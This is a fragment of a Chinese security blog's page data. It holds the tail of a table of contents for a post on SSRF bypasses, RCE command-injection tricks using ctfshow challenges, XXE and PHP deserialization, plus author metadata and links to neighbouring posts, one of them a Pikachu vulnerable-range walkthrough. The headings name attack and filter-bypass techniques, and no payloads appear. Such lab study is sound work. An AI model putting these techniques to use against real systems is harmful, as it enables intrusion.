class=\"toc-item toc-level-6\"><a class=\"toc-link\" href=\"#%E5%AE%9E%E6%88%98%E6%A1%88%E4%BE%8B-4\"><span class=\"toc-text\">实战案例</span></a></li></ol></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E6%9C%89%E9%98%B2%E6%8A%A4%E7%9A%84-SSRF\"><span class=\"toc-text\">有防护的 SSRF</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-6\"><a class=\"toc-link\" href=\"#%E5%8E%9F%E7%90%86-7\"><span class=\"toc-text\">原理</span></a></li><li class=\"toc-item toc-level-6\"><a class=\"toc-link\" href=\"#%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F-2\"><span class=\"toc-text\">绕过方式</span></a></li><li class=\"toc-item toc-level-6\"><a class=\"toc-link\" href=\"#ctfshow-%E9%A2%98%E7%9B%AE%E6%BC%94%E7%A4%BA\"><span class=\"toc-text\">ctfshow 题目演示</span></a></li><li class=\"toc-item toc-level-6\"><a class=\"toc-link\" href=\"#%E6%97%A0%E5%9B%9E%E6%98%BE%E7%9A%84-SSRF\"><span class=\"toc-text\">无回显的 SSRF</span></a></li></ol></li></ol></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#RCE-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E\"><span class=\"toc-text\">RCE 命令执行漏洞</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E4%B8%80%E3%80%81%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86-4\"><span class=\"toc-text\">一、基础知识</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E5%8E%9F%E7%90%86-8\"><span class=\"toc-text\">原理</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5\"><span class=\"toc-text\">命令注入</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C\"><span class=\"toc-text\">代码执行</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E7%9B%B8%E4%BA%92%E8%BD%AC%E6%8D%A2\"><span class=\"toc-text\">相互转换</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95\"><span class=\"toc-text\">利用方法</span></a></li></ol></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E4%BA%8C%E3%80%81%E5%88%A9%E7%94%A8%E4%B8%8E%E7%BB%95%E8%BF%87\"><span class=\"toc-text\">二、利用与绕过</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%8E%A9%E6%B3%95\"><span class=\"toc-text\">伪协议玩法</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E5%85%B3%E9%94%AE%E8%AF%8D%E7%BB%95%E8%BF%87\"><span class=\"toc-text\">关键词绕过</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E6%97%A0%E5%9B%9E%E6%98%BE%E5%88%A9%E7%94%A8\"><span class=\"toc-text\">无回显利用</span></a></li></ol></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E4%B8%89%E3%80%81%E7%99%BD%E7%9B%92%E5%AE%A1%E8%AE%A1-%E4%BB%A3%E7%A0%81%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C\"><span class=\"toc-text\">三、白盒审计&amp;代码命令执行</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#Web29-%E9%80%9A%E9%85%8D%E7%AC%A6\"><span class=\"toc-text\">Web29-通配符</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#Web30-%E5%8F%96%E4%BB%A3%E5%87%BD%E6%95%B0-%E9%80%9A%E9%85%8D%E7%AC%A6-%E7%AE%A1%E9%81%93%E7%AC%A6\"><span class=\"toc-text\">Web30-取代函数&amp;通配符&amp;管道符</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#Web31-%E5%8F%82%E6%95%B0%E9%80%83%E9%80%B8\"><span class=\"toc-text\">Web31-参数逃逸</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#Web32-36-%E9%85%8D%E5%90%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-%E4%BC%AA%E5%8D%8F%E8%AE%AE\"><span class=\"toc-text\">Web32~36-配合文件包含&amp;伪协议</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#Web37-39-%E5%8C%85%E5%90%AB-RCE-%E4%BC%AA%E5%8D%8F%E8%AE%AE-%E9%80%9A%E9%85%8D%E7%AC%A6\"><span class=\"toc-text\">Web37~39-包含 RCE&amp;伪协议&amp;通配符</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E6%9C%AC%E5%9C%B0%E6%A1%88%E4%BE%8B-%E5%BC%82%E6%88%96%E6%97%A0%E7%AC%A6%E5%8F%B7\"><span class=\"toc-text\">本地案例-异或无符号</span></a></li></ol></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%9B%9B%E3%80%81%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95\"><span class=\"toc-text\">四、黑盒测试</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#XML-XXE%E6%BC%8F%E6%B4%9E\"><span class=\"toc-text\">XML&amp;XXE漏洞</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E4%B8%80%E3%80%81%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86-5\"><span class=\"toc-text\">一、基础知识</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#XML\"><span class=\"toc-text\">XML</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#XXE\"><span class=\"toc-text\">XXE</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E6%9C%89%E5%9B%9E%E6%98%BE\"><span class=\"toc-text\">有回显</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E6%97%A0%E5%9B%9E%E6%98%BE\"><span class=\"toc-text\">无回显</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E6%9C%AC%E5%9C%B0DTD%E6%8A%A5%E9%94%99%E5%9B%9E%E6%98%BE%EF%BC%88%E4%B8%8D%E5%87%BA%E7%BD%91%EF%BC%89\"><span class=\"toc-text\">本地DTD报错回显（不出网）</span></a></li></ol></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E4%BA%8C%E3%80%81XXE-%E9%BB%91%E7%9B%92%E5%8F%91%E7%8E%B0\"><span class=\"toc-text\">二、XXE 黑盒发现</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E4%B8%89%E3%80%81XXE-%E7%99%BD%E7%9B%92%E5%AE%A1%E8%AE%A1\"><span class=\"toc-text\">三、XXE 白盒审计</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%9B%9B%E3%80%81XXE-%E9%BB%91%E7%9B%92-JS-%E7%B1%BB%E5%9E%8B%E4%BF%AE%E6%94%B9\"><span class=\"toc-text\">四、XXE 黑盒&amp;JS&amp;类型修改</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E4%BA%94%E3%80%81XXE-%E9%98%B2%E5%BE%A1%E6%89%8B%E6%AE%B5\"><span class=\"toc-text\">五、XXE 防御手段</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96\"><span class=\"toc-text\">PHP反序列化</span></a></li></ol></li></ol></li></ol>","author":{"name":"归尘aliez","slug":"blog-author","avatar":"/images/guichen.jpg","link":"/","description":"<p>斩断昔日旧枷锁，今日方知我是我</p>Journey of a thousand miles begins with single step.","socials":{"github":"https://github.com/gcaliez","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"hidden":false,"prev_post":{"title":"Pikachu靶场攻略（持续更新中）","uid":"5a29724b6f0247fd1b534cffc1124eba","slug":"Pikachu靶场练习","date":"2025-09-20T05:00:00.000Z","updated":"2025-09-21T10:30:27.483Z","comments":true,"path":"api/articles/Pikachu靶场练习.json","keywords":null,"cover":"/images/g.jpg","text":"Pikachu 漏洞平台练习 一、暴力破解 概述 “暴力破解”是一种攻击手段，在 web 攻击中，一般会使用这种手段对应系统的认证信息进行获取。其过程就是使用大...","permalink":"/post/Pikachu靶场练习","photos":[],"count_time":{"symbolsCount":"10k","symbolsTime":"9 mins."},"categories":[{"name":"网安基础","slug":"网安基础","count":4,"path":"api/categories/网安基础.json"}],"tags":[{"name":"Web基础","slug":"Web基础","count":1,"path":"api/tags/Web基础.json"}],"author":{"name":"归尘aliez","slug":"blog-author","avatar":"/images/guichen.jpg","link":"/","description":"<p>斩断昔日旧枷锁，今日方知我是我</p>Journey of a thousand miles begins with single step.","socials":{"github":"https://github.com/gcaliez","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"feature":true},"next_post":{"title":"系统内容","uid":"c0dee51911d3712eb1635eee342507ff","slug":"系统内容","date":"2025-07-22T14:00:00.000Z","updated":"2025-09-20T05:40:43.202Z","comments":true,"path":"api/articles/系统内容.json","keywords":null,"cover":"/images/f.jpg","text":"网安系统内容 一.请求头、响应头 url: URL (Uniform Resource Locator) 是互联网上用于标识和定位资源的字符串，由多个部分组成，...","permalink":"/post/系统内容","photos":[],"count_time":{"symbolsCount":"4.7k","symbolsTime":"4 mins."},"categories":[{"name":"网安基础","slug":"网安基础","count":4,"path":"api/categories/网安基础.json"}],"tags":[{"name":"Web安全","slug":"Web安全","count":4,"path":"api/tags/Web安全.json"}],"author":{"name":"归尘aliez","slug":"blog-author","avatar":"/images/guichen.jpg","link":"/","description":"<p>斩断昔日旧枷锁，今日方知我是我</p>Journey of a thousand miles begins with single step.","socials":{"github":"https://github.com/gcaliez","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"feature":true}}